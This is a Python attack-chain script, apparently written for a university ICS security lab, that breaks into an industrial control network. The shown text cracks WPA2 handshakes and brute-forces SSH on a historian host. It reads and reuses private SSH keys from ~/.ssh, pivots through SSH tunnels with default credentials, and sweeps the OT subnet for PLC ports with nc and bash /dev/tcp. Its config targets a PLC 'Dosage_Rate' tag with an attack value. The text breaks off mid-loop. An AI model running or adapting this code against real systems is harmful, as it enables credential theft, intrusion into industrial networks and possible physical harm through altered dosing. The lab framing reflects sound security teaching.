#!/usr/bin/env python3


import subprocess
import sys
import os
import io
import time
import json
import argparse
import socket
from datetime import datetime
from dataclasses import dataclass, field
from typing import Optional


# ── Dependency bootstrap (inside venv) ───────────────────────────────────────
def _require(pkg, import_name=None):
    import importlib
    name = import_name or pkg
    try:
        return importlib.import_module(name)
    except ImportError:
        print(f"[*] Installing {pkg} into venv...")
        subprocess.run([sys.executable, "-m", "pip", "install", pkg, "-q"], check=True)
        return importlib.import_module(name)

_require("rich")
_require("paramiko")
_require("pycomm3")

from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.rule import Rule
from rich.prompt import Confirm, Prompt
from rich.progress import Progress
from rich.live import Live
from rich.markup import escape
from rich.text import Text
import paramiko

console = Console()

# ── Static config — edit if your lab topology changes ────────────────────────
CFG = {
    "wifi": {
        "interface":    "wlan0",
        "monitor_iface":"wlan0mon",
        "wordlist":     "/usr/share/wordlists/rockyou.txt",
        "capture_file": "/tmp/incs4810_capture",
    },
    "nmap": {
        "idmz_subnet":  "10.10.10.0/24",
        "ports":        "22,80,443,3000,8086,102,44818",
    },
    "historian": {
        "ip":       "10.10.10.20",
        "port":     22,
        "username": "admin",
        "password": "admin123",
    },
    "honeypot": {
        "ip": "10.10.10.50",   # Cowrie — never target directly
    },
    "ids": {
        "ip":       "10.20.20.5",   # RPi5 IDS (Zeek/Suricata) in OT zone
        "username": "admin",         # update if different from Historian
        "password": "admin123",      # update if different from Historian
        "port":     22,
    },
    "plc": {
        "ip":           "10.20.20.111",
        "type":         "Allen-Bradley / Rockwell (EtherNet/IP)",
        "tag":          "Dosage_Rate",
        "safe_value":   8,
        "attack_value": 32,
    },
    "hydra": {
        "wordlist": "/usr/share/wordlists/rockyou.txt",
        "threads":  4,
    },
}

# ── Result tracking ───────────────────────────────────────────────────────────
@dataclass
class PhaseResult:
    phase:   str
    status:  str = "pending"   # pending | success | failed | skipped
    output:  str = ""
    finding: str = ""
    ts:      str = field(default_factory=lambda: datetime.now().isoformat())


results: list[PhaseResult] = []

# ── UI helpers ────────────────────────────────────────────────────────────────

ASCII_BANNER = (
    "██╗  ██╗███████╗███╗   ███╗ ██████╗      ██╗      ██████╗  ██████╗██╗  ██╗\n"
    "██║  ██║██╔════╝████╗ ████║██╔═══██╗     ██║     ██╔═══██╗██╔════╝██║ ██╔╝\n"
    "███████║█████╗  ██╔████╔██║██║   ██║     ██║     ██║   ██║██║     █████╔╝ \n"
    "██╔══██║██╔══╝  ██║╚██╔╝██║██║   ██║     ██║     ██║   ██║██║     ██╔═██╗ \n"
    "██║  ██║███████╗██║ ╚═╝ ██║╚██████╔╝     ███████╗╚██████╔╝╚██████╗██║  ██╗\n"
    "╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝ ╚═════╝      ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝\n"
    "\n"
    "      █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗                    \n"
    "     ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝                    \n"
    "     ███████║   ██║      ██║   ███████║██║     █████╔╝                     \n"
    "     ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗                     \n"
    "     ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗                    \n"
    "     ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝ V1                 \n"
)

def banner():
    console.print(f"[bold red]{ASCII_BANNER}[/bold red]")
    console.print(Panel(
        "[bold white]INCS 4810 — Red Team Attack Chain[/bold white]  "
        "[dim]|  BCIT SW01-3550  |  ISA/IEC 62443[/dim]\n"
        "[dim]Instructor: Victor Mendez  |  BCIT SW01-3550[/dim]\n"
        "[bold yellow]All actions are authorized and confined to the isolated lab network.[/bold yellow]",
        border_style="red",
        expand=False,
    ))


def phase_header(n: int, title: str):
    console.print()
    console.rule(f"[bold cyan]Phase {n}: {title}[/bold cyan]")


def ok(msg: str):
    console.print(f"[bold green] [+][/bold green] [green]{msg}[/green]")


def warn(msg: str):
    console.print(f"[bold yellow] [!][/bold yellow] [yellow]{msg}[/yellow]")


def err(msg: str):
    console.print(f"[bold red] [-][/bold red] [red]{msg}[/red]")


def info(msg: str):
    console.print(f"[bold blue] [*][/bold blue] [blue]{msg}[/blue]")


def run_cmd(cmd: str, timeout: int = 120, capture: bool = True) -> tuple[int, str]:
    """Run a shell command silently, return (returncode, stdout+stderr)."""
    console.print(f"[dim]$ {escape(cmd)}[/dim]")
    try:
        proc = subprocess.run(
            cmd, shell=True, timeout=timeout,
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            text=True
        )
        if capture:
            console.print(f"[dim]{escape(proc.stdout[-2000:])}[/dim]")
        return proc.returncode, proc.stdout
    except subprocess.TimeoutExpired:
        return -1, "TIMEOUT"


def stream_cmd(
    cmd: str,
    timeout: int = 300,
    line_filter=None,
    stop_sentinel: str | None = None,
) -> tuple[int, str]:
    """
    Stream a command's output line-by-line with live display.
    line_filter(line) -> rich markup string, or None to use dim default.
    stop_sentinel: kill the process immediately if this string appears in a line
    (used for hydra -f workaround so we don't wait for the process to flush).
    """
    console.print(f"[dim]$ {escape(cmd)}[/dim]")
    lines: list[str] = []
    start = time.monotonic()

    proc = subprocess.Popen(
        cmd, shell=True,
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
        text=True, bufsize=1,
    )

    try:
        for raw in proc.stdout:
            line = raw.rstrip()
            if not line:
                continue
            lines.append(line)
            styled = line_filter(line) if line_filter else f"[dim]{escape(line)}[/dim]"
            console.print(styled)
            if stop_sentinel and stop_sentinel in line:
                proc.terminate()
                break
    except Exception:
        pass
    finally:
        proc.wait()

    elapsed = time.monotonic() - start
    info(f"Finished in {elapsed:.1f}s  (exit {proc.returncode})")
    return proc.returncode, "\n".join(lines)


def _nmap_filter(line: str) -> str:
    lo = line.lower()
    if "nmap scan report" in lo:
        return f"[bold cyan]{escape(line)}[/bold cyan]"
    if "/tcp" in lo and "open" in lo:
        return f"[green]{escape(line)}[/green]"
    if "host is up" in lo:
        return f"[dim green]{escape(line)}[/dim green]"
    return f"[dim]{escape(line)}[/dim]"




def ssh_connect(hostname: str, username: str, password: str, port: int = 22) -> paramiko.SSHClient:
    """Open and return an authenticated SSHClient. Raises on failure."""
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(
        hostname=hostname,
        port=port,
        username=username,
        password=password,
        timeout=15,
    )
    ok(f"SSH connected  {username}@{hostname}:{port}")
    return client


def ssh_run(client: paramiko.SSHClient, cmd: str, timeout: int = 30) -> tuple[str, str, int]:
    """Execute a command on an open SSHClient, return (stdout, stderr, exit_code)."""
    info(f"remote $ {escape(cmd)}")
    _, stdout_ch, stderr_ch = client.exec_command(cmd, timeout=timeout)
    stdout    = stdout_ch.read().decode()
    stderr    = stderr_ch.read().decode()
    exit_code = stdout_ch.channel.recv_exit_status()
    if stdout.strip():
        console.print(f"[dim]{escape(stdout.strip())}[/dim]")
    if stderr.strip():
        console.print(f"[dim red]{escape(stderr.strip())}[/dim red]")
    return stdout, stderr, exit_code


def ssh_hop(
    jump: paramiko.SSHClient,
    target_ip: str,
    target_port: int,
    target_user: str,
    target_pass: str | None = None,
    pkey: paramiko.PKey | None = None,
) -> paramiko.SSHClient:
    """
    Tunnel an SSH connection through an already-connected jump host.
    Authenticate with either a password or a stolen PKey (never both).
    Returns a fully authenticated SSHClient connected via the jump's transport.
    """
    transport = jump.get_transport()
    dest_addr  = (target_ip,  target_port)
    local_addr = (transport.getpeername()[0], 0)
    chan = transport.open_channel("direct-tcpip", dest_addr, local_addr)

    inner = paramiko.SSHClient()
    inner.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    inner.connect(
        target_ip,
        port=target_port,
        username=target_user,
        password=target_pass,
        pkey=pkey,
        sock=chan,
        timeout=15,
        allow_agent=False,
        look_for_keys=False,
    )
    auth_method = "stolen key" if pkey else "password"
    ok(f"SSH hop → {target_user}@{target_ip}:{target_port}  [{auth_method}]")
    return inner


def confirm_phase(title: str) -> bool:
    console.print()  # blank line so prompt never lands mid-output
    return Confirm.ask(f"[yellow]Run[/yellow] [bold]{title}[/bold]?", default=True)


def _resolve_wordlist(path: str) -> str | None:
    """
    Find rockyou.txt — handle gzipped version on stock Kali,
    and fall back to common alternate locations.
    """
    candidates = [
        path,
        path + ".gz",
        "/usr/share/wordlists/rockyou.txt",
        "/usr/share/wordlists/rockyou.txt.gz",
        "/opt/wordlists/rockyou.txt",
        os.path.expanduser("~/rockyou.txt"),
    ]
    for p in candidates:
        if os.path.exists(p):
            if p.endswith(".gz"):
                extracted = p[:-3]
                if not os.path.exists(extracted):
                    info(f"Extracting {p} ...")
                    run_cmd(f"sudo gunzip -k {p}", capture=False)
                return extracted if os.path.exists(extracted) else None
            return p
    return None


def _find_gateway() -> str | None:
    """Return the default gateway IP from the routing table."""
    rc, out = run_cmd("ip route show default", capture=False)
    for line in out.splitlines():
        parts = line.split()
        if "default" in parts and "via" in parts:
            return parts[parts.index("via") + 1]
    return None


def _inject_route(subnet: str, via: str):
    """Add a host route silently; ignore error if it already exists."""
    run_cmd(f"sudo ip route add {subnet} via {via} 2>/dev/null || true", capture=False)


def _probe_gateway_for_subnets(gateway: str) -> list[str]:
    """
    Send a quick nmap ping sweep through the gateway to discover
    which subnets are reachable, then infer /24 networks from live hosts.
    Works by doing a broad sweep of RFC-1918 space that the gateway routes.
    """
    info(f"Probing gateway {gateway} for reachable subnets...")
    # Sweep private ranges quickly — hosts that reply must be routable via gw
    sweep_targets = "10.0.0.0/8 172.16.0.0/12 192.168.0.0/16"
    rc, out = run_cmd(
        f"sudo nmap -T4 -n --open -sn --send-eth "
        f"--script='' {sweep_targets} 2>/dev/null | grep 'Nmap scan report'",
        timeout=20, capture=False
    )
    found: set[str] = set()
    for line in out.splitlines():
        # "Nmap scan report for 10.10.10.20" → extract /24
        parts = line.strip().split()
        if parts:
            ip = parts[-1].strip("()")
            segments = ip.split(".")
            if len(segments) == 4:
                net = ".".join(segments[:3]) + ".0/24"
                found.add(net)
    return list(found)


def _get_local_interface() -> tuple[str, str] | tuple[None, None]:
    """
    Return (interface_name, local_subnet) for the first non-loopback interface
    that has a default route. e.g. ('eth0', '192.168.10.0/24').
    """
    # Find the interface used by the default route
    _, route_out = run_cmd("ip -4 route show default", capture=False)
    iface = None
    for line in route_out.splitlines():
        parts = line.split()
        if "dev" in parts:
            iface = parts[parts.index("dev") + 1]
            break

    if not iface:
        return None, None

    # Get the subnet assigned to that interface
    _, addr_out = run_cmd(f"ip -4 route show dev {iface}", capture=False)
    for line in addr_out.splitlines():
        parts = line.split()
        if parts and "/" in parts[0] and not parts[0].startswith("default"):
            return iface, parts[0]   # e.g. ('eth0', '192.168.10.0/24')

    return iface, None


def _candidate_gateways(local_subnet: str | None, default_gw: str | None) -> list[str]:
    """
    Build ordered list of gateway candidates to test.
    Priority: default gw → .254 of local subnet → .1 of local subnet.
    """
    candidates: list[str] = []
    if default_gw:
        candidates.append(default_gw)

    if local_subnet:
        prefix = ".".join(local_subnet.split("/")[0].split(".")[:3])
        for last_octet in ("254", "1", "2"):
            cand = f"{prefix}.{last_octet}"
            if cand not in candidates:
                candidates.append(cand)

    return candidates


def auto_route(subnets: list[str]):
    """
    Gateway Hunter — dynamically finds the correct next-hop for each target
    subnet using active TCP reachability tests instead of ICMP ping/redirects.

    For each subnet:
      1. Generate candidate gateways (default gw, .254, .1, .2 of local net)
      2. Inject route via candidate
      3. TCP-probe a real host in that subnet on port 22 (1-second timeout)
      4. If connection succeeds → keep route, move on
      5. If fails → delete route, try next candidate
      6. If all candidates fail → log error, skip subnet
    """
    # Map each subnet to a real host to TCP-probe (not the network address).
    # For OT zone we probe the IDS (Linux box) on port 22 — the PLC drops probes
    # from non-OT source IPs so it cannot be used to validate the route from Kali.
    SUBNET_PROBE = {
        CFG["nmap"]["idmz_subnet"]: (CFG["historian"]["ip"], 22),
        "10.20.20.0/24":            (CFG["ids"]["ip"],       22),
    }

    default_gw           = _find_gateway()
    iface, local_subnet  = _get_local_interface()

    info(f"Local interface : {iface}  subnet: {local_subnet}")
    info(f"Default gateway : {default_gw}")

    candidates = _candidate_gateways(local_subnet, default_gw)
    info(f"Gateway candidates to test: {candidates}")

    for subnet in subnets:
        probe_ip, probe_port = SUBNET_PROBE.get(subnet, (subnet.split("/")[0], 22))
        info(f"Hunting route to {subnet}  (will TCP-probe {probe_ip}:{probe_port})")

        routed = False
        for gw in candidates:
            # Clean up any existing route for this subnet first
            run_cmd(f"sudo ip route del {subnet} 2>/dev/null || true", capture=False)
            # Inject candidate route
            run_cmd(f"sudo ip route add {subnet} via {gw} 2>/dev/null || true", capture=False)

            # Active TCP test — no ping, no ICMP, straight to the port
            if _tcp_reachable(probe_ip, probe_port, timeout=1.0):
                ok(f"Route confirmed: {subnet} via [bold]{gw}[/bold]  "
                   f"(TCP {probe_ip}:{probe_port} reachable)")
                routed = True
                break
            else:
                console.print(f"  [dim]via {gw} → {probe_ip}:{probe_port} unreachable, trying next...[/dim]")
                run_cmd(f"sudo ip route del {subnet} 2>/dev/null || true", capture=False)

        if not routed:
            err(f"No valid route found for {subnet} — "
                f"tried {candidates}. Check FortiGate policy or add route manually.")


def preflight_check():
    """Verify required system tools are installed before running any phase."""
    tools = ["nmap", "aircrack-ng", "airodump-ng", "aireplay-ng", "airmon-ng"]
    missing = []
    for tool in tools:
        rc, _ = run_cmd(f"which {tool}", capture=False)
        if rc != 0:
            missing.append(tool)
    if missing:
        err(f"Missing tools: {', '.join(missing)}")
        err("Install with: sudo apt-get install -y nmap aircrack-ng")
        sys.exit(1)
    ok(f"Preflight OK — all tools found: {', '.join(tools)}")

    # Auto-inject routes to known target subnets so scans reach IDMZ/OT
    auto_route([
        CFG["nmap"]["idmz_subnet"],
        "10.20.20.0/24",
    ])


# ── Phase implementations ─────────────────────────────────────────────────────

def phase1_wifi_crack() -> PhaseResult:
    phase_header(1, "WiFi AP Crack (WPA2 Handshake)")
    r = PhaseResult("WiFi Crack")

    bssid   = Prompt.ask("  Enter AP BSSID  (e.g. AA:BB:CC:DD:EE:FF)")
    channel = Prompt.ask("  Enter AP channel (e.g. 6)")
    cap     = CFG["wifi"]["capture_file"]
    iface   = CFG["wifi"]["interface"]
    mon     = CFG["wifi"]["monitor_iface"]
    wl      = CFG["wifi"]["wordlist"]

    ok("Starting monitor mode...")
    run_cmd("airmon-ng check kill")
    run_cmd(f"airmon-ng start {iface}")

    ok(f"Capturing handshake on ch {channel} (60 s)...")
    warn(f"Run in a second terminal: aireplay-ng --deauth 10 -a {bssid} {mon}")
    run_cmd(
        f"timeout 60 airodump-ng --bssid {bssid} -c {channel} -w {cap} {mon}",
        timeout=75
    )

    ok("Cracking handshake with aircrack-ng...")
    rc, out = run_cmd(f"aircrack-ng {cap}-01.cap -w {wl}", timeout=300)

    if "KEY FOUND" in out:
        key_lines = [l for l in out.splitlines() if "KEY FOUND" in l]
        r.finding = key_lines[0] if key_lines else "KEY FOUND"
        r.status  = "success"
        ok(r.finding)
    else:
        r.status  = "failed"
        r.finding = "Handshake not cracked (try larger wordlist)"
        err(r.finding)

    r.output = out[-1000:]
    return r


def phase2_idmz_recon() -> PhaseResult:
    phase_header(2, "IDMZ Recon (nmap)")
    r = PhaseResult("IDMZ Recon")

    subnet = CFG["nmap"]["idmz_subnet"]
    ports  = CFG["nmap"]["ports"]

    # Target the Historian directly — scanning the whole /24 lets FortiGate drop
    # the flood. -Pn skips ping discovery (FortiGate blocks ICMP too).
    # No --min-rate to avoid triggering rate-limit rules on the firewall.
    # No --open so filtered ports are visible (confirms FortiGate is there).
    target_ip = CFG["historian"]["ip"]
    nmap_cmd = (
        f"sudo nmap -T4 -n -sS -Pn -sV --version-intensity 0 "
        f"-p {ports} {target_ip}"
    )
    info(f"Targeting {target_ip} directly (FortiGate-safe, -Pn, no rate floor)")
    rc, out = stream_cmd(nmap_cmd, timeout=60, line_filter=_nmap_filter)

    historian_found = CFG["historian"]["ip"] in out
    honeypot_found  = CFG["honeypot"]["ip"]  in out

    # Fallback: if nmap output didn't include the IP string (e.g. buffering issue),
    # do a direct TCP check on port 22 to confirm reachability
    if not historian_found:
        info("IP not found in nmap output — falling back to TCP probe on port 22")
        historian_found = _tcp_reachable(CFG["historian"]["ip"], 22, timeout=2.0)

    if historian_found:
        ok(f"Historian confirmed at {CFG['historian']['ip']}")
        r.finding = f"Historian ({CFG['historian']['ip']}) reachable"
        r.status  = "success"
    else:
        warn("Historian not reachable via nmap or TCP probe — check routing/FortiGate")
        r.status  = "failed"
        r.finding = "Historian not reachable"

    if honeypot_found:
        warn(f"[TRAP] Cowrie honeypot at {CFG['honeypot']['ip']} — DO NOT target this host")

    r.output = out[-2000:]
    return r


def _tcp_reachable(ip: str, port: int, timeout: float = 1.0) -> bool:
    """Quick socket test — returns True if TCP port is open and accepting."""
    try:
        with socket.create_connection((ip, port), timeout=timeout):
            return True
    except (socket.timeout, ConnectionRefusedError, OSError):
        return False


BRUTE_BANNER = """\
  ___ ___ ___ _   _ _____ ___   ___ ___  ___ ___ ___
 | _ ) _ \\ | | | |_   _| __| | __/ _ \\| _ \\ __/ __|
 | _ \\   / |_| |   | | | _|  | _| (_) |   / _|\\__ \\
 |___/_|_\\\\___/    |_| |___| |_|_\\___/|_|_\\___|___/

     ___    _   ___ _  __     _    ___  _  _____ ___
    / __|  /_\\ / __| |/ /    /_\\  |   \\| ||_ _| _ \\\ 
   | (__  / _ \\ (__| ' <    / _ \\ | |) | |__| ||   /
    \\___/_/ \\_ \\___|_|\\_\\  /_/ \\_\\|___/|____|___|_|_\\
"""

LOCK_ART = """\
        +-----+
        |     |
        | OT  |
        |HIST |
     +--+-----+--+
     |  LOCKED   |
     |  TARGET   |
     +-----------+
"""


def _ssh_bruteforce(
    ip: str,
    port: int,
    username: str,
    wordlist_path: str,
    delay: float = 0.2,
) -> str | None:
    """
    Sequential paramiko SSH brute forcer with rich Progress bar.
    - AuthenticationException  → wrong password, skip
    - SSHException              → possible rate-limit, wait 1s and retry same password
    - timeout / connection err  → abort after 3 consecutive failures
    """
    priority = ["", username, username[::-1], f"{username}123", "password", "admin123"]

    try:
        with open(wordlist_path, errors="ignore") as f:
            wordlist = [line.strip() for line in f if line.strip()]
    except (FileNotFoundError, OSError):
        wordlist = []

    candidates = list(dict.fromkeys(priority + wordlist))  # ordered dedup
    total = len(candidates)
    MAX_CONSECUTIVE_TIMEOUTS = 3

    consecutive_timeouts = 0
    found_password: str | None = None

    from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TaskProgressColumn, TimeElapsedColumn

    with Progress(
        SpinnerColumn(),
        TextColumn("[bold cyan]{task.description}"),
        BarColumn(bar_width=28),
        TaskProgressColumn(),
        TimeElapsedColumn(),
        console=console,
        transient=False,
    ) as progress:
        task = progress.add_task(
            f"Attempting {username}@{ip}", total=total
        )

        for pw in candidates:
            if progress.finished:
                break

            progress.update(
                task,
                description=f"[bold cyan]Attempting: {username}@{ip}  password: {pw}[/bold cyan]",
            )

            retry = True
            while retry:
                retry = False
                try:
                    client = paramiko.SSHClient()
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    client.connect(
                        hostname=ip,
                        username=username,
                        password=pw,
                        timeout=3,
                        allow_agent=False,
                        look_for_keys=False,
                        banner_timeout=3,
                    )
                    client.close()
                    consecutive_timeouts = 0
                    found_password = pw
                    progress.update(task, completed=total,
                                    description=f"[bold green]FOUND: {username}@{ip}  password: {pw}[/bold green]")
                    break  # exit while

                except paramiko.AuthenticationException:
                    # Wrong password — clean rejection, move on
                    consecutive_timeouts = 0
                    time.sleep(delay)

                except paramiko.SSHException:
                    # Possible rate-limit on Historian — wait 1s and retry same pw
                    progress.update(task,
                        description=f"[yellow]SSHException (rate-limit?) — retrying {pw} in 1s[/yellow]")
                    time.sleep(1)
                    retry = True

                except (socket.timeout, paramiko.ssh_exception.NoValidConnectionsError, OSError):
                    consecutive_timeouts += 1
                    progress.update(task,
                        description=f"[yellow]Timeout {consecutive_timeouts}/{MAX_CONSECUTIVE_TIMEOUTS} on {ip}:{port}[/yellow]")
                    if consecutive_timeouts >= MAX_CONSECUTIVE_TIMEOUTS:
                        progress.update(task,
                            description=f"[red]Network blocked — aborting[/red]")
                        return None
                    time.sleep(1)

            if found_password is not None:
                break
            progress.advance(task)

    return found_password


def phase3_ssh_bruteforce() -> PhaseResult:
    phase_header(3, "SSH Brute Force on Historian (paramiko)")
    r = PhaseResult("SSH Brute Force")

    console.print(f"[cyan]{LOCK_ART}[/cyan]")
    console.print(f"[bold red]{BRUTE_BANNER}[/bold red]")

    ip   = CFG["historian"]["ip"]
    port = CFG["historian"]["port"]
    user = CFG["historian"]["username"]
    wl   = _resolve_wordlist(CFG["hydra"]["wordlist"])

    info(f"Target: {user}@{ip}:{port}")

    # ── Fail-fast: TCP probe only — don't gate on Phase 2 status ─────────────
    # Phase 2 may report failed due to nmap quirks while SSH is still open.
    # The TCP probe is the only authoritative reachability check.
    info(f"TCP probe → {user}@{ip}:{port} ...")
    if not _tcp_reachable(ip=ip, port=port, timeout=2.0):
        r.status  = "failed"
        r.finding = f"Target unreachable — {ip}:{port} timed out (FortiGate may be blocking)"
        err(r.finding)
        return r
    ok(f"Port {port} open on {ip} — starting brute force")

    if not wl:
        warn("rockyou.txt not found — running priority-list only")
        wl = "/dev/null"
    else:
        info(f"Wordlist: {wl}")

    found_pw = _ssh_bruteforce(ip=ip, port=port, username=user, wordlist_path=wl)

    if found_pw is not None:
        # ── ACCESS GRANTED panel ───────────────────────────────────────────────
        console.clear()
        console.print(Panel(
            f"\n[bold white]  ACCESS GRANTED  \n\n"
            f"  User  : [bold yellow]{user}[/bold yellow]\n"
            f"  Host  : [bold yellow]{ip}:{port}[/bold yellow]\n"
            f"  Pass  : [bold yellow]{found_pw}[/bold yellow]\n",
            title="[bold white] SSH COMPROMISED [/bold white]",
            border_style="bold green",
            expand=False,
            padding=(1, 4),
        ))
        r.status  = "success"
        r.finding = f"Credentials confirmed: {user}:{found_pw}"
        CFG["historian"]["password"] = found_pw
    else:
        r.status  = "failed"
        r.finding = f"No valid password found for {user}@{ip}"
        err(r.finding)

    r.output = r.finding
    return r


def phase4_ssh_pivot() -> PhaseResult:
    phase_header(4, "SSH into Historian → Hop to IDS — OT Zone Recon")
    r = PhaseResult("SSH Pivot / OT Recon")

    hist_ip   = CFG["historian"]["ip"]
    hist_user = CFG["historian"]["username"]
    hist_pass = CFG["historian"]["password"]
    hist_port = CFG["historian"]["port"]

    ids_ip    = CFG["ids"]["ip"]
    ids_user  = CFG["ids"]["username"]
    ids_pass  = CFG["ids"]["password"]
    ids_port  = CFG["ids"]["port"]

    plc_ip    = CFG["plc"]["ip"]
    findings  = []
    checks    = {"route": False, "ping": False, "syslog": False}

    PORT_VENDOR = {
        "44818": "Allen-Bradley / Rockwell (EtherNet/IP)",
        "102":   "Siemens S7 (ISO-TSAP)",
        "502":   "Modbus TCP Device",
    }
    SKIP_IPS = {ids_ip, "10.20.20.254"}

    try:
        # ── Step 1: land on Historian ────────────────────────────────────────
        info(f"Connecting to Historian ({hist_ip})...")
        hist_client = ssh_connect(hostname=hist_ip, username=hist_user,
                                  password=hist_pass, port=hist_port)

        # ── Step 2: OT syslog from Historian ────────────────────────────────
        console.print("\n[bold cyan]OT syslog (last 20 lines)[/bold cyan]")
        syslog_out, _, _ = ssh_run(hist_client, "grep '10.20.20' /var/log/syslog | tail -20")
        if syslog_out.strip():
            checks["syslog"] = True
            ok("OT zone syslog entries present")
        else:
            warn("No OT syslog entries — rsyslog forwarding may not be running")
        findings.append(f"Syslog:\n{syslog_out}")

        # ── Step 3: Confirm route to OT zone from Historian ─────────────────
        console.print("\n[bold cyan]Route: Historian → OT zone[/bold cyan]")
        route_out, _, route_rc = ssh_run(hist_client, f"ip route get {ids_ip}")
        if route_rc == 0:
            checks["route"] = True
            ok(f"Route to OT zone ({ids_ip}) exists from Historian")
        else:
            err(f"No route to OT zone from Historian — FortiGate may be blocking")
        findings.append(f"Route:\n{route_out}")

        # ── Step 4: Hop from Historian into IDS (10.20.20.5) ────────────────
        # The IDS lives inside the OT zone (10.20.20.x), so any probe it sends
        # to the PLC will carry a 10.20.20.5 source IP — which the PLC accepts.
        console.print("\n[bold cyan]Hopping Historian → IDS (OT zone)[/bold cyan]")
        info(f"Tunnelling SSH through Historian → {ids_user}@{ids_ip}:{ids_port}")

        # ── 4a. SSH Key Hunting — check Historian's own key first ───────────
        # A blind attacker who can't guess the IDS password can still pivot if
        # the Historian admin has a pre-authorised key pair trusted by the IDS.
        stolen_pkey: paramiko.PKey | None = None
        console.print("\n[bold cyan]SSH Key Hunt — searching Historian ~/.ssh/[/bold cyan]")
        key_out, _, key_rc = ssh_run(hist_client,
            "ls -la ~/.ssh/id_rsa 2>/dev/null && cat ~/.ssh/id_rsa 2>/dev/null || "
            "ls -la ~/.ssh/id_ed25519 2>/dev/null && cat ~/.ssh/id_ed25519 2>/dev/null || "
            "echo __NO_KEY__")

        if "-----BEGIN" in key_out:
            # Extract just the PEM block (everything from -----BEGIN to -----END)
            pem_lines = []
            in_block  = False
            for line in key_out.splitlines():
                if "-----BEGIN" in line:
                    in_block = True
                if in_block:
                    pem_lines.append(line)
                if "-----END" in line and in_block:
                    break
            pem = "\n".join(pem_lines) + "\n"

            try:
                # Try RSA first, then Ed25519
                try:
                    stolen_pkey = paramiko.RSAKey.from_private_key(io.StringIO(pem))
                except paramiko.SSHException:
                    stolen_pkey = paramiko.Ed25519Key.from_private_key(io.StringIO(pem))

                ok("[bold green][+] Stolen SSH Private Key found on Historian! "
                   "Attempting passwordless pivot...[/bold green]")
            except Exception as key_parse_err:
                warn(f"Key found but could not parse it: {key_parse_err}")
                stolen_pkey = None
        else:
            warn("No private key found on Historian — falling back to password list")

        # ── 4b. Attempt hop: stolen key first, then password fallbacks ───────
        IDS_FALLBACKS = [
            (ids_user, ids_pass),           # primary from CFG (tried first)
            ("pi",      "raspberry"),
            ("pi",      "admin123"),
            ("student", "student"),
            ("admin",   "raspberry"),
        ]

        ids_client = None
        last_exc: Exception | None = None

        # Try the stolen key against all plausible usernames before touching passwords
        if stolen_pkey:
            key_users = list(dict.fromkeys(
                [ids_user, "pi", "admin", "student", "kali"]
            ))
            for ku in key_users:
                try:
                    info(f"Trying stolen key as {ku}@{ids_ip}")
                    ids_client = ssh_hop(hist_client, ids_ip, ids_port,
                                         ku, pkey=stolen_pkey)
                    # Persist key + user in CFG so Phases 5 & 6 can reuse them
                    if ku != ids_user:
                        CFG["ids"]["username"] = ku
                    CFG["ids"]["password"]    = ""           # not needed — key auth
                    CFG["ids"]["private_key"] = stolen_pkey  # paramiko.PKey object
                    console.print(Panel(
                        f"[bold white]Method   :[/bold white] [bold green]Stolen SSH Private Key[/bold green]\n"
                        f"[bold white]Username :[/bold white] [bold yellow]{ku}[/bold yellow]\n"
                        f"[bold white]Host     :[/bold white] [bold yellow]{ids_ip}[/bold yellow]\n\n"
                        f"[dim]CFG updated — Phases 5 & 6 will use these credentials[/dim]",
                        title="[bold green] IDS PIVOTED VIA STOLEN KEY [/bold green]",
                        border_style="green",
                        expand=False,
                    ))
                    break
                except paramiko.AuthenticationException as exc:
                    warn(f"  Key rejected for {ku}@{ids_ip}")
                    last_exc = exc

        # If key auth didn't work (or no key), try password list
        if ids_client is None:
            for attempt_user, attempt_pass in IDS_FALLBACKS:
                try:
                    info(f"Trying IDS creds: {attempt_user}@{ids_ip}")
                    ids_client = ssh_hop(hist_client, ids_ip, ids_port,
                                         attempt_user, attempt_pass)
                    if attempt_user != ids_user or attempt_pass != ids_pass:
                        CFG["ids"]["username"] = attempt_user
                        CFG["ids"]["password"] = attempt_pass
                        console.print(Panel(
                            f"[bold white]Username :[/bold white] [bold yellow]{attempt_user}[/bold yellow]\n"
                            f"[bold white]Password :[/bold white] [bold yellow]{attempt_pass}[/bold yellow]\n\n"
                            f"[dim]CFG updated — Phases 5 & 6 will use these credentials[/dim]",
                            title="[bold yellow] IDS Credentials Auto-Corrected [/bold yellow]",
                            border_style="yellow",
                            expand=False,
                        ))
                    break
                except paramiko.AuthenticationException as exc:
                    warn(f"  Auth failed: {attempt_user}@{ids_ip}")
                    last_exc = exc

        if ids_client is None:
            raise last_exc  # bubble up so the outer except block catches it

        # ── Step 5: OT Fingerprinting Sweep — run FROM IDS ──────────────────
        # Source IP = 10.20.20.5 → PLC accepts the probe.
        console.print("\n[bold cyan]OT Fingerprinting Sweep (from IDS — OT zone source)[/bold cyan]")
        info("Probing ports 44818 (AB), 102 (Siemens), 502 (Modbus) across 10.20.20.1–254...")

        nc_check, _, nc_rc = ssh_run(ids_client, "which nc || which ncat || which netcat")
        has_nc = nc_rc == 0 and nc_check.strip()

        if has_nc:
            sweep_cmd = (
                "for i in {1..254}; do "
                "(for p in 102 502 44818; do "
                "nc -z -w 2 10.20.20.$i $p 2>/dev/null "
                "&& echo \"10.20.20.$i:$p\"; "
                "done) & "
                "done; wait"
            )
        else:
            warn("nc not found on IDS — using bash /dev/tcp fallback")
            sweep_cmd = (
                "for i in {1..254}; do "
                "(for p in 102 502 44818; do "
                "(bash -c \"echo > /dev/tcp/10.20.20.$i/$p\" 2>/dev/null "
                "&& echo \"10.20.20.$i:$p\"); "
                "done) & "
                "done; wait"
            )

        sweep_out, _, _ = ssh_run(ids_client, sweep_cmd, timeout=90)

        discovered_devices: list[dict] = []
        for line in sweep_out.splitlines():
            line = line.strip()
            if ":" not in line:
                continue
            parts = line.split(":")
            if len(parts) != 2:
